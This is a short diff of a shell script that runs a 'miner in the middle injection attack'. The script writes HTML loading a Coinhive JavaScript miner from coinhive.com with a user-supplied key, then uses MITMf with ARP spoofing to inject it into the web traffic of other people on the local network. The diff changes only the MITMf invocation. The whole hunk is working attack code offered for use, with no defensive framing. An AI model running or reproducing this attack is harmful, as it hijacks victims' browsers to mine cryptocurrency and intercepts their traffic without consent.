@@ -18,7 +18,7 @@ fi
 if [ $# -eq "3" ]; then
 	echo "Running miner in the middle injection attack..."
 	echo "<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('"$1"');miner.start();</script>" > /root/.miner_itm.html
-	root/MITMf/mitmf.py --inject --html-file /root/.miner_itm.html --spoof --arp --gateway $2 -i $3
+	mitmf --inject --html-file /root/.miner_itm.html --spoof --arp --gateway $2 -i $3
 	rm /root/.miner_itm.html
 fi
 
